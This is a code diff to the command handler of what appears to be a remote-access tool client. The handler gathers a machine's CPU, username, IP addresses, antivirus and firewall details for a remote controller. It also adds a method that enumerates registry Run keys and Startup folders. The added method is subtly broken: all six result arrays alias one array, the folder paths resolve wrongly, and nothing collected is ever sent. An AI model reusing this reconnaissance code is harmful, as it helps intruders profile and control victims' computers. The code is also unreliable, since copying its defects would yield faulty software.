@@ -1,5 +1,6 @@
 ﻿using Client;
 using Core.RemoteShell;
+using Microsoft.Win32;
 using System;
 using System.Diagnostics;
 using System.Drawing;
@@ -13,7 +14,7 @@ namespace Core.Commands
 {
 	public class CommandHandler
 	{
-		[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
+		[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
 		[return: MarshalAs(UnmanagedType.Bool)]
 		private static extern bool DeleteFile(string name);
 		[DllImport("user32.dll")]
@@ -357,27 +358,29 @@ namespace Core.Commands
 		{
 			try
 			{
-				string[] infoCollection = new string[20];
-				infoCollection[0] = "Processor (CPU)";
-				infoCollection[1] = SystemCore.GetCpu();
-				infoCollection[2] = "Memory (RAM)";
-				infoCollection[3] = string.Format("{0} MB", SystemCore.GetRam());
-				infoCollection[4] = "Video Card (GPU)";
-				infoCollection[5] = SystemCore.GetGpu();
-				infoCollection[6] = "Username";
-				infoCollection[7] = SystemCore.GetUsername();
-				infoCollection[8] = "PC Name";
-				infoCollection[9] = SystemCore.GetPcName();
-				infoCollection[10] = "Uptime";
-				infoCollection[11] = SystemCore.GetUptime();
-				infoCollection[12] = "LAN IP Address";
-				infoCollection[13] = SystemCore.GetLanIp();
-				infoCollection[14] = "WAN IP Address";
-				infoCollection[15] = SystemCore.WANIP;
-				infoCollection[16] = "Antivirus";
-				infoCollection[17] = SystemCore.GetAntivirus();
-				infoCollection[18] = "Firewall";
-				infoCollection[19] = SystemCore.GetFirewall();
+				string[] infoCollection = new string[] {
+					"Processor (CPU)",
+					SystemCore.GetCpu(),
+					"Memory (RAM)",
+					string.Format("{0} MB", SystemCore.GetRam()),
+					"Video Card (GPU)",
+					SystemCore.GetGpu(),
+					"Username",
+					SystemCore.GetUsername(),
+					"PC Name",
+					SystemCore.GetPcName(),
+					"Uptime",
+					SystemCore.GetUptime(),
+					"LAN IP Address",
+					SystemCore.GetLanIp(),
+					"WAN IP Address",
+					SystemCore.WANIP,
+					"Antivirus",
+					SystemCore.GetAntivirus(),
+					"Firewall",
+					SystemCore.GetFirewall()
+				};
+
 				new Core.Packets.ClientPackets.GetSystemInfoResponse(infoCollection).Execute(client);
 			}
 			catch
@@ -588,6 +591,52 @@ namespace Core.Commands
 			catch
 			{
 				new Core.Packets.ClientPackets.Status("Action failed!").Execute(client);
+			}
+		}
+
+		public static void HandleGetStartup(object command, Core.Client client)
+		{
+			try
+			{
+				string[] LMRun, LMRunOnce, CURun, CURunOnce, CAStartup, AStartup;
+				LMRun = LMRunOnce = CURun = CURunOnce = CAStartup = AStartup = new string[50];
+
+				using (var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false))
+				{
+					for (int i = 0; i < key.GetValueNames().Length && i < LMRun.Length; i++)
+						LMRun[i] = string.Format("{0}||{1}", key.GetValueNames()[i].ToString(), key.GetValue(key.GetValueNames()[i]));
+				}
+				using (var key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", false))
+				{
+					for (int i = 0; i < key.GetValueNames().Length && i < LMRunOnce.Length; i++)
+						LMRunOnce[i] = string.Format("{0}||{1}", key.GetValueNames()[i].ToString(), key.GetValue(key.GetValueNames()[i]));
+				}
+				using (var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", false))
+				{
+					for (int i = 0; i < key.GetValueNames().Length && i < CURun.Length; i++)
+						CURun[i] = string.Format("{0}||{1}", key.GetValueNames()[i].ToString(), key.GetValue(key.GetValueNames()[i]));
+				}
+				using (var key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", false))
+				{
+					for (int i = 0; i < key.GetValueNames().Length && i < CURunOnce.Length; i++)
+						CURunOnce[i] = string.Format("{0}||{1}", key.GetValueNames()[i].ToString(), key.GetValue(key.GetValueNames()[i]));
+				}
+				if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
+				{
+					var files = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")).GetFiles();
+					for (int i = 0; i < files.Length && i < CAStartup.Length; i++)
+						CAStartup[i] = string.Format("{0}||{1}", files[i].Name, files[i].FullName);
+				}
+				if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")))
+				{
+					var files = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")).GetFiles();
+					for (int i = 0; i < files.Length && i < AStartup.Length; i++)
+						AStartup[i] = string.Format("{0}||{1}", files[i].Name, files[i].FullName);
+				}
+			}
+			catch
+			{
+				new Core.Packets.ClientPackets.Status("Startup Information failed!").Execute(client);
 			}
 		}
 	}
